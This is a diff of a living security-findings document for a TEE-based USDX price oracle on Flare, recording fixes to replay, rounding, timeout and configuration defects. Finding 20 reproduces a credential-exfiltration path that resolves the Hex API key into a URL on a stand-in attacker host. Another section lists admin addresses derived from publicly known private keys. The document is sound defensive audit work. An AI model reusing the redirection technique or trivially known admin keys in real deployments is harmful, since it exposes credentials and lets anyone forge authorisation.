@@ -1,6 +1,6 @@
 # USDX Oracle — Implementation Findings
 
-**Status:** living document · **Last updated:** 2026-08-04
+**Status:** living document · **Last updated:** 2026-08-05
 
 Findings discovered while implementing the extension, each with the evidence
 that established it and the test that now pins it. Design intent lives in
@@ -21,13 +21,16 @@ quietly mispublished.
 | 6 | Rounding instead of truncating reports full backing for an under-backed token | **Medium** | `TestCompute_TruncatesNeverRounds` |
 | 7 | The sign wire is base64, not hex | **Medium** | `TestClaim3_WireIsBase64NotHex` |
 | 8 | An empty `sourceHealth` map reads as healthy | **Low** | `config.HealthUnknown` |
-| 9 | The TEE machine status enum's numeric values are not published | **High** | `REQUIRED_TEE_STATUS` (parameterised, unresolved) |
+| 9 | ~~The TEE machine status enum's numeric values are not published~~ **RESOLVED** | **High** | `REQUIRED_TEE_STATUS = TeeStatus.PRODUCTION` (constant) |
 | 10 | secp256k1 malleability gives one report two valid signatures | **Medium** | `test_RejectsMalleableSignature` |
 | 11 | A `TeeExtensionStateVerifier` is NOT required — the spec is wrong | Info | `register(address(0), …)` in the scaffold |
 | 12 | ~~The production entrypoint lands in stub mode silently~~ **RESOLVED** | **High** | `TestStubMode_CannotBeEnteredAccidentally` |
 | 15 | The contract owner key can set any RPC host and any threshold — accepted | **High** | `TestAnyHostIsAccepted` |
 | 16 | On-chain config recorded what was *sent*, not what a machine *runs* | **High** | `test_RejectsReportFromStaleConfig` |
 | 17 | Full audit of every logging and error surface found no sensitive disclosure | Info | §17 audit + the finding-1 tests |
+| 18 | The report's target binding was removed pre-launch — deliberate | Info | registry check + governance |
+| 19 | Concurrent provisioning bypassed the envelope replay defence entirely | **High** | `TestApplySecret_ConcurrentReplayAdmitsExactlyOne` |
+| 20 | The owner could redirect the Hex API key into a URL of their choosing | **High** | `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret` |
 
 ---
 
@@ -215,6 +218,12 @@ sign the way tee-node does, normalise, then recover the way the contract will.
 
 ## 6. Truncation is load-bearing, not a style choice
 
+> **⚠ Reversed 5 Aug 2026 — the price now rounds half-up. See finding 21.** The
+> reasoning below is why truncation was chosen and is still why the *bound*
+> matters; what changed is the measurement that the bound was traded against.
+> `TestCompute_TruncatesNeverRounds` is now
+> `TestCompute_RoundsHalfUp` plus `TestCompute_RoundingCannotHideAMaterialShortfall`.
+
 **Severity: Medium.** Reports full backing for a token that is not fully backed.
 
 Spec §3.5 specifies rounding down. The reason deserves recording: at 8 decimals,
@@ -295,17 +304,30 @@ machines keep publishing prices indefinitely. Guess too high and every
 submission reverts, which is a total feed outage that would only be discovered
 after deployment.
 
-**Resolution (partial).** The expected value is a constructor parameter,
-`REQUIRED_TEE_STATUS`, not a hard-coded constant. The contract is correct for
-whatever the right value turns out to be, tests cover both the matching and
-non-matching cases, and the unknown is visible at the deployment boundary rather
-than buried in a comparison.
+**RESOLVED.** Read from source —
+`flare-smart-contracts-v2/contracts/userInterfaces/tee/IMachineManager.sol`:
 
-**Still required before mainnet:** confirm the enum against
-`flare-smart-contracts-v2` and set the parameter accordingly. Also confirm
-whether `getExtensionId` reverts or returns 0 for an unknown machine — the store
-handles both (`try/catch` plus a value check), but the behaviour should be
-recorded rather than merely defended against.
+```solidity
+enum TeeStatus { NONE, INITIALIZED, PRODUCTION, SUSPENDED, PAUSED, BANNED }
+```
+
+So `PRODUCTION == 2`. Confirmed independently on Coston2: the live machine
+`0x2ab1a473…` reports status 2 and appears in `getActiveTeeMachines(0x10193)`.
+
+The enum is restated on `ITeeMachineRegistry` and `REQUIRED_TEE_STATUS` is now
+the constant `uint8(TeeStatus.PRODUCTION)` rather than a constructor parameter.
+Only one value is ever correct, so a parameter was a footgun — and it fired: the
+Coston2 store was deployed with `1`, which is `INITIALIZED`, meaning it rejects
+every production machine while accepting one that registered but was never
+promoted via `toProduction()`.
+
+**Note for the deployment checklist:** the earlier reading of the spec prose
+(`docs`, "Machine statuses") put `paused` at 1. That ordering does not match the
+enum. Trust the source, not the prose.
+
+`NONE == 0` also answers the sub-question about unknown machines: a machine that
+was never registered reports `NONE`, so the status comparison alone rejects a
+stranger, independently of the `getExtensionId` check.
 
 ---
 
@@ -522,11 +544,31 @@ Split into `URLSecretRef` and `AuthSecretRef`.
 
 ### Open
 
-The admin set is **still placeholder addresses**
-(`0x1111…`, `0x2222…`, `0x3333…`) with `Threshold = 2`.
+The admin set is **still placeholder addresses** with `Threshold = 2`.
 `TestAdminSetIsNotPlaceholder` skips with a warning today and must become a hard
 failure once real keys are baked. Nothing can be provisioned against a live
 deployment until they are.
+
+**Corrected 5 Aug 2026.** This section previously described the placeholders as
+`0x1111…`, `0x2222…`, `0x3333…`. They are not. They are the addresses of
+**private keys 1, 2 and 3**:
+
+```
+0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf   privkey 0x01
+0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF   privkey 0x02
+0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69   privkey 0x03
+```
+
+The difference is not cosmetic, and the old wording understated the risk in the
+safe-sounding direction. `0x1111…` has no known private key, so an envelope
+could never be signed for it and provisioning would fail closed. The keys above
+are the most widely known in existence, so **anyone can produce two valid admin
+signatures today**. The M-of-N threshold currently provides no protection
+whatever; what stands between an attacker and `SET_SECRET` is the proxy's
+`DIRECT_API_KEY` and network reach, not the admin set.
+
+`internal/provision` states this correctly in both the code comment and
+`TestAdminSetIsNotPlaceholder` — the drift was in this document alone.
 
 ---
 
@@ -562,8 +604,11 @@ spec's stronger wording in place.
   on path can dictate a supply figure
 - `{secret}` may not appear in a URL's scheme or host, so the credential holder
   cannot change the destination even though the URL author can
-- a credential containing `/ ? #` or whitespace is rejected, so substitution
+- a credential containing `/ ? # &` or whitespace is rejected, so substitution
   cannot restructure a URL
+- the backing credential (`hex_api_key`) may not be named as a provider secret,
+  so the URL author cannot choose a destination for the one credential whose
+  destination is otherwise pinned — see finding 20
 - threshold must be between 1 and the provider count, so a chain cannot be
   configured to fail on every observation
 - every pinned chain must be present, since a missing one undercounts supply and
@@ -579,7 +624,7 @@ a named test rather than silently altering behaviour.
 
 ---
 
-## 16. The report's target binding was removed pre-launch
+## 18. The report's target binding was removed pre-launch
 
 **Severity: informational. A deliberate simplification, recorded so the absence
 is a documented decision rather than an oversight.**
@@ -595,8 +640,9 @@ computed by attested code from the configured sources regardless of what the
 payload binds. The binding fields never protected the price itself — only
 *where a correctly-signed price could be delivered*:
 
-- `feedId` was redundant outright: one store serves one feed, `FEED_ID` is
-  immutable, and the store binding already determined the destination.
+- `feedId` was redundant outright: the store binding already determined the
+  destination. (`FEED_ID` was subsequently removed from the store as well — see
+  the note at the end of this finding.)
 - `store` blocked replay into other deployments under the same extension id —
   including deployments governance did not intend — but such a replay still
   delivers a genuine TEE price, never a forged one.
@@ -615,7 +661,21 @@ config (schema v5 drops `target`; the chain id stays, because provisioning
 envelopes still bind to it), `extension-setup.sh` no longer writes a deployed
 address into the config (`deploy-store` records it in the deployed-addresses
 file instead), and the image no longer needs the store deployed before it is
-built. `FEED_ID` remains on the store as the feed's FTSO identity.
+built.
+
+**Follow-up: `FEED_ID` removed from the store too.** It was written in the
+constructor and never read there; its only consumer anywhere was a
+`FeedMismatch` guard in `UsdxCustomFeed`'s constructor. That guard could not
+earn its keep. `FtsoV2.addCustomFeeds` and `FtsoV2.replaceCustomFeeds` take no
+feed id argument — both read `feedId()` off the contract being registered — so
+the adapter is the sole authority on the id and the store's copy was never
+consulted by anything. The guard would have caught a mistyped id, which FtsoV2
+already rejects loudly at the governance step (`"feed does not exist"`), while
+missing the failure that actually matters: an adapter deployed against the
+*wrong store* with the right id passes the id check and silently serves another
+store's price. That belongs in `verify-deploy` as a `newFeed.STORE()` assertion
+before the governance proposal, not in a constructor. Removing it also unblocks
+a second adapter over one store under a different id, which the check forbade.
 
 ---
 
@@ -749,6 +809,296 @@ That field is a convenience; the enforcement is on-chain.
 
 ---
 
+## 19. Concurrent provisioning bypassed the replay defence entirely
+
+**Severity: High. Resolved.**
+
+`provision.Verifier` keeps `lastVersion[ref]` in a plain map and documented
+itself as "not safe for concurrent use; the extension serialises handler
+invocations, so the caller already holds a lock."
+
+**No such lock existed.** `/action` is an ordinary `net/http` handler, so
+tee-node delivering two direct actions at once runs two `ApplySecret`
+goroutines. `runtimecfg.Store` took `s.mu` only around the `s.secrets` write,
+well after `Verify` had already read and written the version map.
+
+Two consequences, and the second is the serious one:
+
+- **Concurrent map write.** In Go this is a hard runtime throw, not a
+  recoverable panic — the process dies. Inside a TEE that is a restart, and
+  since credentials are memory-only, a restart drops every secret.
+- **The replay defence did not hold.** The version check is read-then-write
+  across `Verify`. Run unserialised, every goroutine reads the same old version
+  and each concludes it is newer. Measured with the lock removed, **one captured
+  envelope submitted 8 times in parallel was accepted 8 times**:
+
+  ```
+  --- FAIL: TestApplySecret_ConcurrentReplayAdmitsExactlyOne
+      8 of 8 replays accepted, want exactly 1
+  ```
+
+  `version` was documented as blocking in-session rollback. Against a parallel
+  submitter it blocked nothing. The 15-minute `issuedAt` window still bounded
+  the exposure, so an attacker needed an envelope less than 15 minutes old —
+  but within that window the defence was bypassable by firing concurrently
+  rather than sequentially.
+
+**Resolution.** `runtimecfg.Store` gained a dedicated `applyMu`, held across the
+whole of `ApplyEndpoints` and `ApplySecret`, so the verifier is never entered
+concurrently.
+
+Two locks rather than one, deliberately. `s.mu` is also taken by `Readiness` and
+`Resolve`, and `ApplySecret` makes two tee-node round trips (`TeeID`,
+`Decrypt`); holding `s.mu` across those would let a hung `/decrypt` freeze
+`GET /state` and every observation. `applyMu` covers the verifier for the whole
+call, `s.mu` stays a short-critical-section data lock, and the order is always
+`applyMu` → `mu`.
+
+Pinned by `TestApplySecret_ConcurrentReplayAdmitsExactlyOne` (the security
+property) and `TestApplySecret_IsSafeUnderConcurrency` (the race, under
+`-race`). Both fail with the lock removed. The `Verifier` doc comment now names
+`applyMu` as the serialising caller instead of asserting a lock that was never
+there.
+
+---
+
+## 20. The owner could redirect the Hex API key into a URL of their choosing
+
+**Severity: High. Resolved.**
+
+Finding 2 rates disclosure of the Hex credential High and hardens
+`backing.New()` against redirects to protect it. Finding 15 accepts that the
+owner key can name any RPC host. Neither noticed what the two imply together.
+
+`Provider.Secret` is payload-controlled and was looked up in the *same* secret
+store that holds the backing credential:
+
+```go
+url, err := resolveURL(p.URL, p.Secret, s.secrets[p.Secret])
+```
+
+Nothing stopped a `SET_ENDPOINTS` payload naming `hex_api_key` as an RPC
+provider's secret. Reproduced against the real decoder:
+
+```
+step 1: payload ACCEPTED — hex_api_key is usable as a provider secret
+step 2: resolved URL = https://attacker.example/collect/SUPER-SECRET-HEX-KEY
+```
+
+Normally that credential travels as an **auth header** to the compiled-in
+`HexCashURL` and never leaves it. Through this path it travels in the **URL
+path** of a host the payload author chose, on the next observation.
+
+**What this changed about finding 15.** That finding reasons entirely about
+price control, and its enforced-list says `{secret}` cannot appear in scheme or
+host "so the credential holder cannot change the destination even though the URL
+author can" — treating the URL author as trusted with destinations. But the URL
+author and the credential holder are different parties by design. The real blast
+radius of an owner-key compromise was therefore larger than recorded: not only
+can the holder set the price, they can **harvest every provisioned credential**,
+including the one finding 2 goes to some length to protect. That strengthens the
+case for finding 15's first mitigation (multisig or timelock on the owner).
+
+**Resolution.** `validate()` rejects any provider naming `config.HexAPIKeyRef`
+as its secret. This is the `URLSecretRef` / `AuthSecretRef` split of finding 14
+enforced at the boundary rather than left to convention, and it matters most for
+this ref because it is the one credential whose destination is otherwise pinned
+and so not the owner's to choose.
+
+Note this does **not** stop the owner exfiltrating *RPC* credentials — those are
+inherently sent to owner-chosen hosts, which is the accepted trade in finding 15.
+It closes the cross-purpose case, where a credential issued for a pinned
+endpoint is redirected somewhere else entirely.
+
+**Related hardening in the same pass.** `&` was missing from the rejected
+credential character set, so a credential substituted into a query *value*
+(`?key={secret}`) could append parameters of its own. The set now lives in one
+`urlUnsafe` constant used by both checkpoints — `ApplySecret` on arrival and
+`resolveURL` at substitution. Two hand-copied security-relevant character sets
+was itself the latent bug: the one that drifts is the one that stops matching.
+
+Pinned by `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret`,
+`TestApplySecret_RejectsQuerySeparatorOnArrival`, and the `&` case added to
+`TestApplySecret_RejectsCredentialThatWouldAlterAURL`.
+
+---
+
+## 21. Truncation froze the feed below par on a rounding artifact
+
+**Severity: Medium.** The feed prints a depeg that has not happened, and — with
+the cash source unavailable — publishes nothing at all.
+
+**Measured 5 Aug 2026**, against live sources:
+
+| | value |
+| --- | --- |
+| supply, Flare + Ethereum + Songbird | 25,452,544.524018 |
+| `current_reserves_amount` | 25,452,544.52 |
+| B − S | **−0.004018** |
+| B / S | 0.9999999998 |
+
+Hex quotes the reserve figure **to the cent**; supply carries 6 decimals on
+Flare and Songbird and 18 on Ethereum. The published bond figure is therefore
+supply with up to $0.01 of quantisation removed, and it sits below supply for
+roughly half of all observations for no economic reason whatsoever.
+
+Under truncation that lands as `99999999` — 0.99999999, a printed depeg caused
+entirely by Hex's number formatting. Finding 6's argument (an error that can
+only ever understate) is correct, but the quantity it was protecting against
+turns out to be $0.004 on a $25.4M float.
+
+**Resolution: round half-up.** `⌊x·10^8 + ½⌋`. The shortfall this can conceal is
+bounded by construction at half a unit in the last place — **$0.127** at current
+supply, or 5e-9 of the float — while worst-case cent quantisation is $0.0099, so
+the artifact is absorbed with a 12× margin. Nothing material is affected: a 1%
+depeg still prints as `99000000`, pinned by
+`TestCompute_RoundingCannotHideAMaterialShortfall`.
+
+The exact arithmetic is what makes the bound trustworthy. `big.Rat` throughout,
+including the ½ — `TestCompute_RoundingBoundaryIsExact` uses a ratio a float64
+would push over the boundary and publish as par.
+
+### The cash-less observation rule
+
+The same finding unblocked the availability question. The restricted cash
+endpoint has one URL and one credential, and until Hex issues a key there is no
+cash figure at all. `oracle.Observe` therefore accepts a nil cash source, and
+`price.ComputeWithoutCash` decides what may be published:
+
+> Publish only when the bonds-only price already reaches par. Cash is
+> non-negative and the price is capped at par, so if bonds alone reach par then
+> the complete computation reaches par too. The published number is provably the
+> one a full observation would have produced.
+
+Everything else fails closed with `BackingUnavailable`. This is **not** the
+graceful degradation `usdx-oracle-availability.md` argues against, and the
+difference is the whole point: degradation would publish `min(1, R_bonds/S)`
+whenever cash was missing — at `R_bonds = 0.99·S` that is 0.990 against a true
+0.998, dropping exactly the buffer that decides whether a depeg prints, with
+nothing in the signed payload to say so. Here that case publishes nothing.
+
+The rule only has teeth because of the rounding change: at 0.9999999998 the
+bonds-only price reaches par under rounding and did not under truncation. Cash
+at $205,304 is 806,615 units in the last place, six orders of magnitude beyond
+what rounding can absorb — so this admits the quantisation artifact and nothing
+else. Pinned by `TestComputeWithoutCash_MatchesTheFullComputation`, which asserts
+equality against the full formula for every non-negative cash figure.
+
+`GET /state` reports the source as `not_configured` rather than omitting it —
+finding 8's rule, applied to a source that is absent by provisioning rather than
+by outage. `Readiness.Ready` stays false while the key is missing: a machine that
+can answer for only part of the price range must not claim to be provisioned.
+
+---
+
+## 22. `requestPriceUpdate()` could never dispatch: the registry rejects an empty message
+
+**Severity: High.** The instruction path did not work at all. No price could ever
+have reached the chain.
+
+Found on Coston2, 5 Aug 2026, the first time the on-chain request path was
+exercised end to end. `requestPriceUpdate()` reverted with `0x3b06a1be` —
+`MessageEmpty()` — from `TeeExtensionRegistry.sendInstructions`.
+
+The contract passed `message: ""`, because the observation needs nothing from
+the caller. The registry requires a non-empty message. The controlled
+comparison is clean: `setEndpoints` sends a non-empty config and had been
+delivered and applied minutes earlier on the same machine.
+
+**Why it survived until now.** `git log -S` puts the empty message in the
+contracts' first commit (`05c1692`). Nothing had ever called it on-chain: the
+only caller was `run-test`, which was failing earlier in the flow — it still
+JSON-decoded the Phase-2 stub shape, so it never got as far as dispatching a
+second instruction against a real machine. Two latent defects hid each other.
+
+The two sides were also in direct contradiction: the registry demands a
+non-empty message, and `processGetPrice` rejected *any* non-empty payload with
+`UnexpectedPayload` — deliberately, so that no caller could depend on a field
+the extension silently drops.
+
+**Resolution: a fixed one-byte request envelope**, `GET_PRICE_REQUEST_V1 =
+hex"01"` in the sender, `config.GetPriceRequestV1` in the extension. The handler
+requires exactly that value and rejects everything else, so the no-silent-drops
+rule survives intact — it is now "exactly this known envelope" rather than
+"nothing at all" — and a future envelope version cannot be mistaken for this
+one. Pinned by `TestProcessGetPrice_RequiresTheRequestEnvelope`, which covers
+empty, a wrong version, a doubled byte and a zero byte, and by conformance
+fixtures 01 and 03.
+
+**Incidental, unfixed:** `setExtensionId()` on a freshly deployed sender is
+called only by `run-test`, never by a deploy script, so a new sender reverts
+`Extension ID is not set.` until someone runs the test tool. It should move into
+`pre-build.sh`.
+
+---
+
+## 23. An observation cannot fit in the 2 seconds tee-node allows
+
+**Severity: High.** Every GET_PRICE request timed out; the extension's answer
+was discarded before it could be relayed.
+
+Found immediately after finding 22 was fixed — the instruction dispatched, and
+the result came back `status 3`:
+
+```
+Post "http://localhost:7702/action": context deadline exceeded
+```
+
+tee-node gives an extension **2 seconds** to answer any action:
+
+```go
+// tee-node@v0.0.18 internal/extension/extension.go
+client := http.Client{Timeout: settings.ProxyTimeout}   // const ProxyTimeout = 2 * time.Second
+```
+
+It is a `const` in an `internal/` package: not an env var, not a config field,
+and unreachable from this module. Measured against live sources on 5 Aug 2026,
+from a well-connected host, a complete observation takes **2.0–2.9s** — two
+supply rounds across three chains, two Hex fetches, and a signing round trip,
+with `HTTPTimeout` alone at 5s per upstream attempt. Inside the container it was
+worse. There is no configuration of the synchronous design that fits.
+
+**Resolution: observe on a timer, sign on demand.** `internal/observe` runs
+`oracle.Observe` every `ObservationInterval` (2 min) and keeps the latest
+result; `GET_PRICE` calls `oracle.Sign`, which binds that observation to the
+requesting instruction id — one signing round trip, milliseconds. `oracle.Observe`
+no longer signs, and `Observation` carries `EndpointsHash` so a later signature
+commits to the configuration in force *when the inputs were read*, not whatever
+is current when the request arrives.
+
+**What this does not change.** `observedAt` still means when the inputs were
+read; it is simply no longer the instant of the request. Every existing
+freshness guard survives — `BackingMaxAge` in package backing, `checkWindow`
+across inputs, `maxAge` on the store.
+
+**What it adds.** A cache introduces a staleness mode the request-time design did
+not have, so `MaxObservationAge` (10 min) bounds it: past that, GET_PRICE
+returns `ObservationStale` and publishes nothing, letting the on-chain value age
+visibly. At a 2-minute interval that tolerates four consecutive failed
+observations. A single failure does **not** discard the cached observation —
+one flapping RPC provider must not stop a feed whose price is still fresh —
+but health does reflect the failed attempt, which is the only signal an operator
+gets while a cached price is still being served.
+
+Two new vocabulary entries, both publishable: `NoObservation` (asked before the
+first round completed) and `ObservationStale`. Pinned by
+`TestLatest_FailsClosedWhenStale`, `TestReport_DoesNotSignAStaleObservation` and
+`TestRecord_FailureKeepsTheLastGoodObservation`.
+
+**Worth raising upstream:** 2 seconds is a tight budget for any extension that
+talks to an external source, and it is not discoverable — it presents as a
+`status 3` result with a client-timeout string, not as a documented limit.
+
+**Verification status.** The fix is built and covered by unit, conformance and
+contract suites, and the latency it removes was measured directly. It has **not
+yet been confirmed on-chain**: the Coston2 run stopped before the first
+submission because the machine could not reach PRODUCTION — the availability
+proof needs the TEE proxy reachable from outside, and the ngrok tunnel fronting
+it went down. Everything else on that chain is in place (see the deployment
+table in the plan), so the remaining step is a registration, not a code change.
+
+---
+
 ## Design decisions recorded while implementing
 
 These are not defects, but they were judgement calls an auditor will want the
@@ -844,3 +1194,17 @@ every consumer. A pause freezes the value; it does not blind the feed.
   much detail internal logging may carry.
 - **Feed name and category byte** — to be agreed with Flare before registration.
 - **`sourceHealth` granularity** — per-chain vs per-provider, finding 8.
+- **`agreedBlock` takes the minimum head with no agreement on the head itself**
+  (found 5 Aug 2026, unresolved). Quorum protects the supply *value*, not the
+  *block selection*, so one provider reporting an old head drags every other
+  provider to that block — and the honest ones then agree on a stale figure.
+  Not caught downstream: every freshness check is wall-clock, never block time.
+  Fixing it means either quorum-protecting the head or bounding its spread
+  against the median, both needing a per-chain number, and neither helping
+  Songbird at quorum 1. Full write-up pending the tuning decision.
+- **Two `coston2.json` fixtures with different schemas** (found 5 Aug 2026).
+  `go/testdata/endpoints/` holds the pre-pinning full-config format, which the
+  current decoder rejects; the repo-root one is correct. Publishing the wrong
+  one sets `expectedConfigHash` on-chain while the extension keeps its old
+  config, halting the feed on `StaleConfig` until a correct payload is sent.
+  `send-endpoints` should decode against the real schema before spending gas.
